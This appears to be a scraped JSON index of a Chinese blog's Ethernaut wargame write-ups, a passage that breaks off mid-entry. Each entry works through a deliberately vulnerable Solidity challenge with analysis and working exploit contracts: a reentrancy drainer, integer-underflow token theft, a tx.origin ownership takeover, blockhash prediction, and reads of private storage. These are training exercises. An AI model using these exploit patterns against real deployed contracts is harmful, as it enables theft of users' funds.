uint256 gas) external &#123; IGateKeeperOne target = IGateKeeperOne(_target); uint16 k16 = uint16(uint160(tx.origin)); uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); bytes8 key = bytes8(k64); require(gas &lt; 8191, &quot;gas &gt; 8191&quot;); require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &quot;failed&quot;); &#125; &#125; 3.解题 3.1 获取关卡实例地址：0xAd682B7a072dc407361a23D0C9Ee9f1C16dEa187 3.2 部署攻击合约，调用enter() 函数，将关卡实例地址传入enter() 函数中，并设置gas &#x3D; 256 3.3 提交案例 3.4 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Privacy","slug":"Smart contracts/ethernaut/Privacy","date":"2023-01-09T02:16:15.000Z","updated":"2023-01-09T02:16:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Privacy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Privacy/","excerpt":"","text":"Privacy1. 题目要求 1.1 这个合约的制作者非常小心的保护了敏感区域的 storage.解开这个合约来完成这一关.这些可能有帮助: 理解 storage 的原理 理解 parameter parsing 的原理 理解 casting 的原理 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Privacy &#123; bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(block.timestamp); bytes32[3] private data; constructor(bytes32[3] memory _data) &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^` .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*., *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^ ,---/V\\ `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*. ~|__(o.o) ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39; UU UU */ &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. 分析- 2.1 目标：将locked修改为false - `bool public locked`初始化为 true 并保存必须设置为 false 才能赢得挑战的值 - `bytes32[3] private data`是存储我们的密钥的变量。我们需要找出`data[2]`解决挑战的价值- 2.2 我们可以将所有其他变量仅视为“存储填充”，以达到我们想要读取的内容 ( `data[2]`) 以解决挑战。 - `constructor(bytes32[3] memory _data)`初始化`data`变量的值 - 然后我们只需检查我们传递的输入`unlock(bytes16 _key)`是否与值匹配。如果比较返回 true，我们就**解锁了**合约，通过了挑战。`byte16 _key``data[2]``true`- 2.3 `data`首先，必须检索变量中的数据。这可以通过从区块链上的合约存储中提取数据来完成。在 brownie 中，这可以使用 来完成`web3.eth.getStorageAt()`，第一个参数是合约的地址，以及要查看的合约存储槽的方向。每个槽的容量为 32 字节（256 位），这意味着实际填满 32 字节槽的数据类型将占用整个槽，因此后续数据类型将滚动到下一个槽。如果数据类型声明为`uint256`或`bytes32`，它将始终占用一个完整的存储槽，因为这些类型的大小已经是 32 字节。 在隐私合约的情况下，我们知道相关数据是数组的最后一个元素`data`。因此，要提取这个，我们必须确定这条数据在*哪里，在什么存储槽中。*- 2.4 [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- ![image-20230224230120932](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020025595.png)- 2.5 在浏览器控制台依次执行 **web3.eth.getStorageAt() ** ，**data.slice(0,34)** 命令## 3 .解题- 3.1 获取关卡实例地址：0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0- 3.2 依次执行如下代码得到 data[2] - ```solidity addr = &quot;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&quot; &#x27;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&#x27; await web3.eth.getStorageAt(addr, 5) &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data = &quot;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&quot; &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data.slice(0,34) &#x27;0xa9cbb829703de0df913fc95cc78d10df&#x27; 3.3 调用实例部署的合约，并查看locked 的值为true 3.4 将执行data.slice(0,34) 得到的值传入unlock的形参中，并调用unlock() 函数 3.5 查看locked的值，值由true 变成 false 3.6 提交实例 3.7 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Delegate","slug":"Smart contracts/ethernaut/Delegate","date":"2023-01-09T01:32:10.000Z","updated":"2023-01-09T01:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Delegate/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Delegate/","excerpt":"","text":"Delegate1. 题目要求 1.1 这一关的目标是申明你对你创建实例的所有权. 这可能有帮助 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响. Fallback 方法 方法 ID 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Delegate &#123; address public owner; constructor(address _owner) &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125; &#125; contract Delegation &#123; address public owner; Delegate delegate; constructor(address _delegateAddress) &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; fallback() external &#123; (bool result,) = address(delegate).delegatecall(msg.data); if (result) &#123; this; &#125; &#125; &#125; 2. 分析 2.1 elegation.sol 这是我们可以直接访问的合约。让我们来看看。它有两个状态变量： address public owner存储合约所有者的公共变量 Delegate delegate``Delegate对我们刚刚看到的合同的引用 合约constructor的 将其address _delegateAddress作为唯一的输入参数，delegate用它初始化状态变量并用 初始化所有者msg.sender 2.2 通过修改燃料限制的方法，出错了。。。 开始网上寻找解决方法，解决方法：修改编辑燃料费选项为 “高级” 3. 解题 3.1 获取关卡实例地址：0x6eE471bd0AE8A991C76972ADB0365D7cfC4e3fE9 3.2 通过实例地址调用合约 3.3 调用Dlegate合约中的 pwn()函数，将燃料限制从29328修改为39328 3.3 发现做错了 wwww….. 弄了好久，原来是需要修改编辑燃料费选项, 将其设置为“高级” 3.4 再次调用pwn() 函数，地址修改成功 3.5 到EtherScan 查看交易记录，发现成功调用pwn函数 3.6 提交实例并查看结果 3.7 成功！！！！ tips：1.参考博客 2. 参考视频","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Elevator","slug":"Smart contracts/ethernaut/Elevator ","date":"2023-01-08T13:16:15.000Z","updated":"2023-01-08T13:16:15.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Elevator /","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Elevator%20/","excerpt":"","text":"Elevator1. 题目要求 1.1 电梯不会让你达到大楼顶部, 对吧? 这可能有帮助: 有的时候 solidity 不是很擅长保存 promises. 这个 电梯 期待被用在一个 建筑 里. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Building &#123; function isLastFloor(uint) external returns (bool); &#125; contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125; &#125; 123456789101112131415161718192021222324252627282930## 2. 分析#### tips： [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 `isLastFloor()`的返回值必须为 False 才能`floor`更改并变为`top`true。我想到了两种方法： 1. 我们让我们的顶层不是 0（ 的起始值`floor`）并且我们检查是否`floor`是顶层的数值。然后我们定义函数返回当前值和顶层值`isLastFloor()`之间的比较。`floor` 2. 我们创建了一个将电梯发送到其当前楼层 (0) 的函数，但我们运行此函数两次，第一次，我们确保返回`isLastFloor()`false，然后仅返回 true。这实际上意味着我们的顶层是 0 层。但是在第二次运行期间，`top`变成了真的。- 2.2 [参考视频](https://www.youtube.com/watch?v=IfljmOqThvI) 写的攻击合约- ```solidity contract Hack &#123; Elevator private immutable target; uint private count; constructor(address _target) &#123; target = Elevator(_target); &#125; function pwn() external &#123; target.goTo(1); require(target.top(), &quot;not top&quot;); &#125; function isLastFloor(uint) external returns (bool) &#123; count++; return count &gt; 1; &#125; &#125; 3. 解题 3.1 获取关卡实例地址： 0x156b4F96D63961020a9fe45947d4eAB6F4053aA8 3.2 通过实例地址部署攻击合约： 3.3 调用pwn() 函数 3.4 提交实例查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Re-entrancy","slug":"Smart contracts/ethernaut/Re-entrancy","date":"2023-01-08T10:13:13.000Z","updated":"2023-01-08T10:13:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Re-entrancy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Re-entrancy/","excerpt":"","text":"Re-entrancy1. 题目要求 1.1 这一关的目标是偷走合约的所有资产. 这些可能有帮助: 不可信的合约可以在你意料之外的地方执行代码. Fallback methods 抛出&#x2F;恢复 bubbling 有的时候攻击一个合约的最好方式是使用另一个合约. 查看上方帮助页面, “Beyond the console” 部分 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.6.12; import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; receive() external payable &#123;&#125; &#125; 123456789101112131415161718## 2. 分析#### tips: [参考博客](https://stermi.medium.com/the-ethernaut-challenge-9-solution-re-entrancy-635303881a4f)- 2.1 分析代码- ```solidity function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; - a.该功能检查是否`msg.sender`有足够的余额来提取`_amount`以太币 - b.`_amount`它继续通过一个低级函数发送请求，`call`该函数将使用所有剩余的`gas`来执行操作 - c.它更新`msg.sender`减少金额的余额 &#96;漏洞利用选项 1，懒惰而不聪明的选项：在循环中利用重入 如果资金不是问题，我们可以0.001 ether / 100通过donate函数发送并重新进入withdraw函数 100 次 + 初始调用。 0.001 ether / 100只是一个任意值，我们只需要确保在重新进入函数时不会消耗太多气体，withdraw否则交易会因为Out of Gas 异常而恢复。 漏洞利用选项 2，切肉刀方式：利用重入和下溢 这个解决方案要优雅得多，它利用了两个不同的问题：重入和下溢！ 我们已经知道重入问题，并且我们说balances[msg.sender] -= _amount“正常”操作的下溢将受到保护，因为balances[msg.sender] &gt;= _amount即使该操作不使用SafeMath，如果我们确定 max，也没有办法下溢可能balances[msg.sender]会归零。 但是因为我们可以重新输入，所以我们可以执行两次相同的balances[msg.sender] -= _amount操作，所以我们的余额第一次会变为零，但第二次会type(uint256).max因为下溢而变为零！ 此时，我们可以调用withdraw提取存储在受害者合约中的全部以太币！ 注意：第二种解决方案只有在下溢的情况下才有可能。如果不存在下溢问题，我们仍然可以通过重入循环解决方案来解决挑战。&#96; 2.2 参考视频 写的攻击合约: interface IReentracy &#123; function donate(address) external payable; function withdraw(uint256) external; &#125; contract Hack&#123; IReentracy private immutable target; constructor(address _target) public &#123; target = IReentracy(_target); &#125; function attack() public payable&#123; target.donate.value(0.001 ether)(address(this)); target.withdraw(1e18); &#125; receive() external payable &#123; uint amount = min(1e18, address(target).balance); if (amount &gt; 0) &#123; target.withdraw(amount); &#125; require(address(target).balance == 0, &quot;target balance &gt; 0&quot;); selfdestruct(payable(msg.sender)); &#125; function min(uint x, uint y) private pure returns(uint) &#123; return x &lt;= y ? x : y; &#125; &#125; 2.3 进行重入攻击即可 3. 解题 3.1 获取关卡的实例：0xcf96fB43ffF6B6F8c05f353ce8271931271E69b0 3.2 利用实例地址部署Hack合约，调用attrack() 函数 设置msg.value &#x3D; 1 ether 3.3 提交实例并查看结果 3.4 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"King","slug":"Smart contracts/ethernaut/King","date":"2023-01-08T08:17:13.000Z","updated":"2023-01-08T08:17:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/King/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/King/","excerpt":"","text":"King1. 题目要求 1.1 题目：下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.这么有趣的游戏, 你的目标是攻破他, 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract King &#123; address king; uint public prize; address public owner; constructor() payable &#123; owner = msg.sender; king = msg.sender; prize = msg.value; &#125; receive() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; &#125; function _king() public view returns (address) &#123; return king; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析### tips：[参考博客](https://stermi.medium.com/the-ethernaut-challenge-9-solution-king-ee9a689bcf0e)- 2.1 阅读代码可知，该`receive`函数是一个**特殊**函数，允许合约直接从外部合约或 EOA 接收以太币- 2.2 我们首先看到的是`require(msg.value &gt;= prize || msg.sender == owner)`。此检查允许`owner`合约的 始终拥有合约的王权，重置所有值。- 2.3 所以现在我们知道`transfer`允许您将 Ether 发送到一个地址，消耗`2300`gas 并在无法执行交易时**恢复。** 如果“将以太币转移到”交易恢复，为什么会出现问题？好吧，因为如果还原，我们的功能`transfer`也会**还原！**并且通过还原它会使**合约无法使用**，没有人可以成为新的国王！`receive` 一种可能的解决方案是只创建一个`Contract`不接受任何类型的 Ether 转移的对象。- 2.4 攻击合约- ```solidity contract Exploiter &#123; constructor(address payable _to) payable &#123; (bool success, ) = address(_to).call&#123;value: msg.value&#125;(&quot;&quot;); require(success, &quot;call failed!!!&quot;); &#125; &#125; 2.5 获取实例地址，并填入到Exploiter合约构造器中 3. 解题 3.1 获取关卡实例地址：0x25766108F8Fa65C8061FB17E7762D4BC42Fc882C 3.2 调用关卡实例部署的合约，得到实例合约中的prize 3.3 根据关卡实例地址部署攻击合约 3.4 Deploy后查看king的值发生了改变 3.5 提交实例 3.6 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Vault","slug":"Smart contracts/ethernaut/Vault","date":"2023-01-08T07:10:10.000Z","updated":"2023-01-08T07:10:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Vault/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Vault/","excerpt":"","text":"1.题目要求 1.1 要求 ：打开 vault 来通过这一关! 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Vault &#123; bool public locked; bytes32 private password; constructor(bytes32 _password) &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125; &#125; 2. 分析 2.1 在区块链上使用或开发时，首先要记住的是，区块链中没有任何东西是私有的。即使您将变量声明为private或 ，也可以看到所有内容internal 2.2 状态变量存储在合约存储中，因为变量password是一个 32 字节的数据，它总是会填满整个槽，使得它在合约的第二个槽中的位置非常可预测，因为第二个状态变量定义。 在这种情况下，我们可以很容易地使用web3.pygetstorageat()上的功能，通过在第二个存储槽中查找来查看密码是什么。然后我们可以选择将其转换为文本以查看密码是什么。 2.3 在浏览器控制台上执行 * await web3.eth.getStorageAt(contract.address,1) * 命令 获取password 然后在 关卡实例部署的合约上输入获取到的 password 3. 解题 3.1 获取关卡实例地址：0x3741430AB42C816Dbbe583001C9615049ad09e31 3.2 执行 *await web3.eth.getStorageAt(contract.address,1) * 得到password ：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 调用实例部署 的合约,并调用合约的 unlock() 函数： 3.3 对比调用 unlock() 函数之后locked 的值 3.4 提交案例并查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Token","slug":"Smart contracts/ethernaut/Token","date":"2023-01-08T06:30:10.000Z","updated":"2023-01-08T06:30:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Token/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/","excerpt":"","text":"Token1. 题目要求 1.1 这一关的目标是攻破下面这个基础 token 合约 1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好 1.3 合约代码： // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析- 2.1 编译器版本：`^0.6.0`，且没用SafeMath库，所以可能出现整数溢出漏洞- 2.2 代码分析：- `require(balances[msg.sender] - _value &gt;= 0);`检查用户余额是否大于或等于零，但由于余额是无符号整数，当我们减去的数字 ( `_value`) 大于代`balances[msg.sender]`币的钱包余额 ( ) 时，就会发生溢出，钱包余额变为最大无符号整数减去这两个值之间的差值。 通过 require 语句后，还有一个错误是将这个溢出的值赋值给 的余额`msg.sender`：- 2.3 攻击合约：- ```solidity contract Hack &#123; function attarck() public &#123; // 实例地址 Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB); // 自己的钱包地址 token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100); &#125; &#125; 2.4 调用Hack 合约中的 attract() 函数 3. 解题 3.1 获取关卡实例地址：0x03130C8ca692f8980461A9C96411aAf5e0A71AcB 3.2 部署攻击合约 3.3 查看我的钱包地址的余额 3.4 开始合约攻击，并查看余额 3.5 提交实例，返回结果，成功！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Telephone","slug":"Smart contracts/ethernaut/Telephone","date":"2023-01-08T04:47:10.000Z","updated":"2023-01-08T04:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Telephone/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Telephone/","excerpt":"","text":"1. 题目要求 要求： 获取合约的所有权 合约代码： 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 2. 分析 2.1 状态owner变量在constructor，唯一会更新owner的函数是 changeOwner(),它是一个只接受一个参数的公共函数address _owner。如果tx.origin值不同，msg.sender它将owner使用函数输入参数更新_owner。 2.2 tx.origin() 和 msg.sender()的区别 tx.origin(address)： 交易的发送方（完整的调用链）返回的是已发送（原始）交易的地址 msg.sender( address)：消息的发送者（当前通话）返回的是发起呼叫的值external（合约调用者） 画图区分： 2.3 攻击合约： contract Hack &#123; function exploit(Telephone level) public &#123; level.changeOwner(msg.sender); &#125; &#125; 2.4 调用Hack 合约中的 exploit（）函数，形参是关卡的实例地址就🆗的 3. 解题 3.1 获取关卡的实例：0xf956A62d9BD792a712763aA21863d3025A5dd926 3.2 调用关卡合约并部署攻击合约 3.3 查看原拥有着，并调用攻击合约中额exploit() 函数 3.4 提交实例并查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"CoinFlip","slug":"Smart contracts/ethernaut/CoinFlip","date":"2023-01-08T02:12:10.000Z","updated":"2023-01-08T02:12:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/CoinFlip/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/CoinFlip/","excerpt":"","text":"CoinFilp1. 题目要求这是一个掷硬币的游戏，你需要连续的猜对结果。 完成这一关，你需要通过你的超能力来连续猜对十次。 2. 分析2.1 tips： 参考视频 2.2 _guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false2）我们知道不能flip()在同一个块中调用多次；否则该功能将恢复。这意味着要通过挑战，我们至少需要猜对 11 个区块 2.3 攻击合约： contract Hack &#123; CoinFlip private immutable target; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _target) &#123; target = CoinFlip(_target); &#125; function flip() external &#123; bool guess = _guess(); require(target.flip(guess),&quot;guess failed&quot;); &#125; function _guess() private view returns(bool) &#123; uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; return side; &#125; &#125; 2.3 调用 10次 攻击合约的 flip() 函数 来改变 CoinFilp 合约中 consecutiveWins 的值 3. 解题 3.1 获取关卡的实例：0x2F3D37ae048f36c8B2674aB1a4B8D3Bab4B6B716 3.2 在remix中调用关卡合约 3.3 部署攻击合约 3.5 调用 11次 合约中filp() 函数 3.6 提交实例并查看结果 成功！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallout","slug":"Smart contracts/ethernaut/Fallout","date":"2023-01-08T01:47:10.000Z","updated":"2023-01-08T01:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Fallout/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Fallout/","excerpt":"","text":"Fallout1.题目要求获得以下合约的所有权来完成这一关 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address payable allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(address(this).balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 2. 分析 import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; 2.1 由于没有SafeMath.sol文件在remix中，所以可以在remix中建相同路径的文件夹 2.2 阅读代码可知，在fal1out() 函数中可以修改合约的所有权，即成功调用fal1out()函数即可 3. 解题 3.1 获取关卡实例地址： 0x578d3Fca5950E9CB155B91002FAe154796D05217 3.2 调用关卡合约 3.3 3.4 查看原合约拥有者 3.5 调用Fal1out() 函数之后，再次查看合约的owner 3.6 提交实例并查看结果 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallback","slug":"Smart contracts/ethernaut/Fallback","date":"2023-01-07T08:47:10.000Z","updated":"2023-01-07T08:47:10.000Z","comments":true,"path":"2023/01/07/Smart contracts/ethernaut/Fallback/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/07/Smart%20contracts/ethernaut/Fallback/","excerpt":"","text":"Fallback题解1. 题目要求① 获得这个合约的所有权 ② 把它的合约余额减到0 提示： 如何通过与ABI互动发送ether 如何在ABI之外发送ether 转换 wei&#x2F;ether 单位 (参见 help() 命令) Fallback 方法 合约代码：123456789101112131415161718192021222324252627282930313233343536373839404142// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123; mapping(address =&gt; uint) public contributions; address public owner; constructor() &#123; owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return 